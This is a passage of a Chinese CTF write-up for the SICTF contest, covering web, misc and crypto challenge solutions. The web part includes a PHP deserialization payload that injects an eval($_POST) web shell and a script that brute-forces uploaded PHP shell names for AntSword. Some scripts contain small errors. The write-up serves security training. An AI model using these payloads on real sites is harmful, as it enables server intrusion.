class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">text</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$tmp</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-variable">$tmp</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]);<br>           <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono?&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need some ???&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化$var<br><img src="/mdimg/sictf/8.png"><br>url编码admin赋值给username<br><code>/x9sd.php?username=%2561%2564%256d%2569%2561&amp;unserx=TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoxNjoiZXZhbCgkX1BPU1RbMV0pOyI7fQ==</code><br><img src="/mdimg/sictf/9.png"><br><img src="/mdimg/sictf/10.png"></p><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>可以上传php文件，但是要爆破文件名，文件名和时间戳有关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>url = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">100000000</span>, <span class="hljs-number">200000000</span>):<br>    re = url + <span class="hljs-title function_ invoke__">str</span>(i) + <span class="hljs-string">&quot;.php&quot;</span><br>    r = requests.<span class="hljs-title function_ invoke__">post</span>(q)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">404</span>:<br>        a = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">print</span>(re)<br>  <br></code></pre></td></tr></table></figure><p>在本地搭一个环境，在本地和远程上传（尽量快）<br>跑出来文件名就可以连antsward了</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="签到打卡完成"><a href="#签到打卡完成" class="headerlink" title="签到打卡完成"></a>签到打卡完成</h4><p><img src="/mdimg/sictf/11.png">    </p><blockquote><p>010打开附件找到key：SICTF，平台就是青少年的，公众号直接搜（非预期）</p></blockquote><p><img src="/mdimg/sictf/12.png"><br>预期解：</p><p>用ps改一下亮度</p><p>原图<br><img src="/mdimg/sictf/13.png">    </p><p><strong>QRresearch 扫</strong><br><img src="/mdimg/sictf/14.png"><br><code>[http://weixin.qq.com/r/dS-v9yPE436crWeU93pn](http://weixin.qq.com/r/dS-v9yPE436crWeU93pn)    </code></p><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><img src="/mdimg/sictf/15.png"><br>非预期：</p><blockquote><p>stegsolve打开图片查看颜色通道，发现二维码，扫描                        </p></blockquote><p><img src="/mdimg/sictf/16.png"><br>微信QR有纠错，扫描有几率扫出来<br>预期解：</p><blockquote><p>颜色修复工具：<a href="https://github.com/Byxs20/FrequencyColor">https://github.com/Byxs20/FrequencyColor)</a>)</p></blockquote><p>输入序号1-30<br><img src="/mdimg/sictf/17.png"><br><img src="/mdimg/sictf/18.png"><br><code>SICTF&#123;448e8531-c752-4847-ae7e-0e702a8fb915&#125;</code></p><h4 id="geek-challenge"><a href="#geek-challenge" class="headerlink" title="geek_challenge"></a>geek_challenge</h4><p>计算就完事了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">import pwn<br>X = pwn.<span class="hljs-title function_ invoke__">remote</span>(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-keyword">while</span> True:<br>   tmp = X.<span class="hljs-title function_ invoke__">recvline</span>()<br>    <span class="hljs-keyword">print</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>())<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;= ?&quot;</span> in tmp:<br>        res = <span class="hljs-keyword">eval</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>()[:-<span class="hljs-number">5</span>])<br>        data = <span class="hljs-title function_ invoke__">str</span>(res).<span class="hljs-title function_ invoke__">encode</span>()<br>        X.<span class="hljs-title function_ invoke__">sendline</span>(data)<br></code></pre></td></tr></table></figure><h4 id="王八树木"><a href="#王八树木" class="headerlink" title="王八树木"></a>王八树木</h4><p>文件16进制逆序<br>树木使用工具还原 附地址<a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br><code>FileReverse-Tools.py -i 树木</code><br>得到jpg图片 分理出pass.txt  bandzip 爆破得到123456<br><img src="/mdimg/sictf/19.png"><br>解7z得到<code>SI!!!!!!</code><br>使用SilentEye<br><img src="/mdimg/sictf/20.png"><br>得到 <code>2,1,2</code><br>猫脸变换还原flag.bmp  a=3，b=1成功了 脚本可能有问题<br><img src="/mdimg/sictf/21.png"><br><code>SICTF&#123;a9549c89-d261-4bd7-9643-60874dbd28b8&#125;    </code>                </p><h4 id="EzMisc"><a href="#EzMisc" class="headerlink" title="EzMisc"></a>EzMisc</h4><p>伪加密WinRAR修复就行<br>得到<img src="/mdimg/sictf/22.png"><br><code>Xkey:MI43nQrRjQaFTALBTO4JmNJxjO4VcO4Vy</code><br>随波逐流<br><img src="/mdimg/sictf/23.png"><br><code>ohhhhh~</code>解压7z</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">from PIL import Image<br><br>from base64 import b64encode ,b64decode<br><br>from FLAG import FLAG<br><br>import cv2<br><br>OOO000O0000000OOO =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">OO00000O0O00OOOOO =&#x27;</span>&#x27;<br>O0OO0OO0O0O0OOOO0 =Image .open (OOO000O0000000OOO )<br>O000OOO0O0000OO00 =Image .open (OO00000O0O00OOOOO )<br>OOO0OO0O00OO0O00O =cv2 .imread (<span class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string">OO00OOO0OOO000OO0 =OOO0OO0O00OO0O00O .shape [1]</span><br><span class="hljs-string">O0OOO0OOO00OO00OO =OOO0OO0O00OO0O00O .shape [0]</span><br><span class="hljs-string">O0000OOO0O00O00OO =Image .new (&quot;RGB&quot;,(OO00OOO0OOO000OO0 ,O0OOO0OOO00OO00OO ))</span><br><span class="hljs-string">OO00OOOO00O0OOO0O =O0OO0OO0O0O0OOOO0 .convert (&#x27;</span>RGB<span class="hljs-number">&#x27;</span>)<br>O000OOO0O0OO0000O =O000OOO0O0000OO00 .convert (<span class="hljs-string">&#x27;RGB&#x27;</span>)<br><span class="hljs-keyword">for</span> OOO0O0OO000O0O000 in range (OO00OOO0OOO000OO0 ):<br>    <span class="hljs-keyword">for</span> OOOOO0000000O0OOO in range (O0OOO0OOO00OO00OO ):<br>        OO0OO00O0O0000O0O ,OO000O0O00000O0O0 ,OOO0O00OO000O0O00 =OO00OOOO00O0OOO0O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO00OOOO0OOO000OO ,O000OO0O0OO00O0O0 ,O00000OO0OO0O0OOO =O000OOO0O0OO0000O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO00OOOO0OOO000OO =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O000OO0O0OO00O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O00000OO0OO0O0OOO =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O0OOO0000OOOOO00O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0O0OOOOO0O00OO0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O00O00O00OO0O00O0 =OOO0O00OO000O0O00 ^O00000OO0OO0O0OOO<br>        <span class="hljs-keyword">if</span> (O0OOO0000OOOOO00O ==<span class="hljs-number">0</span> ):<br>            O0OOO0000OOOOO00O =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (OO0O0OOOOO0O00OO0 ==<span class="hljs-number">0</span> ):<br>            OO0O0OOOOO0O00OO0 =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (O00O00O00OO0O00O0 ==<span class="hljs-number">0</span> ):<br>            O00O00O00OO0O00O0 =<span class="hljs-number">255</span><br>        O0OOO0000OOOOO00O =str (b64encode (str (O0OOO0000OOOOO00O ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        OO0O0OOOOO0O00OO0 =str (b64encode (str (OO0O0OOOOO0O00OO0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        O00O00O00OO0O00O0 =str (b64encode (str (O00O00O00OO0O00O0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        with open (<span class="hljs-string">&#x27;secret~.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)as file0 :<br>            print (O0OOO0000OOOOO00O [::<span class="hljs-number">-1</span> ],OO0O0OOOOO0O00OO0 [::<span class="hljs-number">-1</span> ],O00O00O00OO0O00O0 [::<span class="hljs-number">-1</span> ],file = file0 )<br><br><br></code></pre></td></tr></table></figure><p><del>偷一下Byxs20✌的jio本</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">import cv2<br>import base64<br>import numpy as np<br><br>with <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-string">&quot;secret~.txt&quot;</span>)</span> as f:<br>    data = f.read().splitlines()[:<span class="hljs-number">-2</span>]<br><br>img = []<br><span class="hljs-keyword">for</span> line in data:<br>    bgr = [base64.b64decode(i[::<span class="hljs-number">-1</span>]).decode() <span class="hljs-keyword">for</span> i in line.split(<span class="hljs-string">&quot; &quot;</span>)][::<span class="hljs-number">-1</span>]<br>    img.append(bgr)<br>img = np.<span class="hljs-built_in">array</span>(img, np.uint8)<br><br>dic = &#123;<span class="hljs-number">1</span>: <span class="hljs-number">268780</span>, <span class="hljs-number">2</span>: <span class="hljs-number">134390</span>, <span class="hljs-number">4</span>: <span class="hljs-number">67195</span>, <span class="hljs-number">5</span>: <span class="hljs-number">53756</span>, <span class="hljs-number">10</span>: <span class="hljs-number">26878</span>, <span class="hljs-number">20</span>: <span class="hljs-number">13439</span>, <span class="hljs-number">89</span>: <span class="hljs-number">3020</span>, <span class="hljs-number">151</span>: <span class="hljs-number">1780</span>, <span class="hljs-number">178</span>: <span class="hljs-number">1510</span>, <span class="hljs-number">302</span>: <span class="hljs-number">890</span>, <span class="hljs-number">356</span>: <span class="hljs-number">755</span>, <span class="hljs-number">445</span>: <span class="hljs-number">604</span>, <span class="hljs-number">604</span>: <span class="hljs-number">445</span>, <span class="hljs-number">755</span>: <span class="hljs-number">356</span>, <span class="hljs-number">890</span>: <span class="hljs-number">302</span>, <span class="hljs-number">1510</span>: <span class="hljs-number">178</span>, <span class="hljs-number">1780</span>: <span class="hljs-number">151</span>, <span class="hljs-number">3020</span>: <span class="hljs-number">89</span>, <span class="hljs-number">13439</span>: <span class="hljs-number">20</span>, <span class="hljs-number">26878</span>: <span class="hljs-number">10</span>, <span class="hljs-number">53756</span>: <span class="hljs-number">5</span>, <span class="hljs-number">67195</span>: <span class="hljs-number">4</span>, <span class="hljs-number">134390</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> height, width in dic.items():<br>    cv2.imwrite(f<span class="hljs-string">&quot;./out/&#123;height&#125;_&#123;width&#125;.png&quot;</span>, img.reshape(height, width, <span class="hljs-number">3</span>))<br><br></code></pre></td></tr></table></figure><p>得到<br><img src="/mdimg/sictf/24.png"><br>一眼丁真小鸟游六花（<del>我不是二次元</del><br>题目说的拼音就是这个了，oursercet解flag.评就行<br><img src="/mdimg/sictf/25.png"><br><code>**SICTF&#123;3d04cd71-5b2d-4bce-abec-a6f2f95c3665&#125;**</code></p><h4 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h4><p><img src="/mdimg/sictf/26.png"><br>一眼丁真要rabbit解密，那么就是要找key和密文了<br>tshark提取base64<br><img src="/mdimg/sictf/27.png"><br><img src="/mdimg/sictf/28.png"><br>得到key：<code>Gui_1s_shumu</code><br><img src="/mdimg/sictf/29.png"><br>密文<code>U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQByITd05Uu05ZAv0o=</code><br><img src="/mdimg/sictf/30.png"></p><h4 id="hacker2"><a href="#hacker2" class="headerlink" title="hacker2"></a>hacker2</h4><p>题目说明 ：树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助<br>定位http流<br>冰蝎流量<br>flag格式：SICTF{shell名称_密钥_文本文件中存储的字符串}<br>随便翻，知道shell名字是<code>she1l</code><br><img src="/mdimg/sictf/31.png"><br>在第一个流中找到了key<code>7d7c23e87b47368b</code><br><img src="/mdimg/sictf/32.png"><br>在这个流中解出了关键信息字符串<br><code>uU7xO0V/KGySO6rdSlEw/dQXFklZWZn1EMhiAAoH7WNpJcvkV3JcvqHelZOOHVA0YKUdylNKNgf4+x+WrC/GkA==</code><br><img src="/mdimg/sictf/33.png"><br><code>c0rRect!!!</code><br>SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h4 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h4><p>稍微改下脚本，循环异或3，然后base解密<br><img src="/mdimg/sictf/34.png">            </p><h4 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br>m=libnum.s2n(flag)<br>n=getPrime(<span class="hljs-number">16</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">233</span>):<br>    n*=getPrime(<span class="hljs-number">16</span>)<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br><span class="hljs-string">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>一眼丁真，跟bugku的一题几乎一样:<a href="https://ctf.bugku.com/challenges/detail/id/214.html">https://ctf.bugku.com/challenges/detail/id/214.html</a><br>n由多个质因子生成，用sage的euler_phi(n)函数求欧拉函数<br><img src="/mdimg/sictf/35.png"><br>求出phi就是普通解RSA了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Unit.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br>c = <span class="hljs-number">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br>e = <span class="hljs-number">65537</span><br>phi = <span class="hljs-number">156367601475974402995143336378908040952860477592140281716502923468101002113603962472338202519343293683021813608492616735571335781889806580494592433061437445590103680183939182694030477690083123849381638384615403358528373448247586608040831464913727117628732036460516169834885530364477189488436897498824548971447505421979260430779757085905057701828890183301766003676422858872328029117473240600494292339226314733362682083999649134377189961569453868222950898463303662344115641021534838224401932268491972483326181312907141447088889872329127098638446483836443651704520477509821707797504856532033842982959066448341585137132145274813016240735092150523868970094517671115496874544078013828715295441650530874907072326026489798290753786116282315362518192114644603753496977012739114909700085784320423720398538929947664466373783000579482811416733852154360821231242559299052271498254335229659178377535891895087327910350143351556120064417902643002970719306110925104438203052958221625710867669659366694336983490603020446389462306989147274444803125646343536640000000000000000000000000000000000000000000000000000000000</span><br><br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m)<br><span class="hljs-comment">#SICTF&#123;13578a78-1bd1-483e-8c01-4d501c8b52bb&#125;</span><br></code></pre></td></tr></table></figure><h4 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>k = getRandomNBitInteger(<span class="hljs-number">64</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br><span class="hljs-keyword">if</span> isPrime(p) <span class="hljs-keyword">and</span> isPrime(q):<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, n, e</span>):<br>m = bytes_to_long(msg)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(m, e, n)<br><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>c = encrypt(flag, n, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment">#n = 2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br><span class="hljs-comment">#c = 1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br></code></pre></td></tr></table></figure><p>n=p*q，代进去相当于只有k一个未知量，解方程即可<br>sage的solve函数可以求解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>k = var(<span class="hljs-string">&#x27;k&#x27;</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>a=n==p*q <br>k = solve(a, k)<br><span class="hljs-built_in">print</span>(k)<br><span class="hljs-comment">#k == 10453474106135055672</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/sictf/36.png"><br>解出k带进去原来脚本就可以求p，q了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>c = <span class="hljs-number">1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br>e = <span class="hljs-number">65537</span><br>k = <span class="hljs-number">10453474106135055672</span><br>p = k**<span class="hljs-number">5</span> + 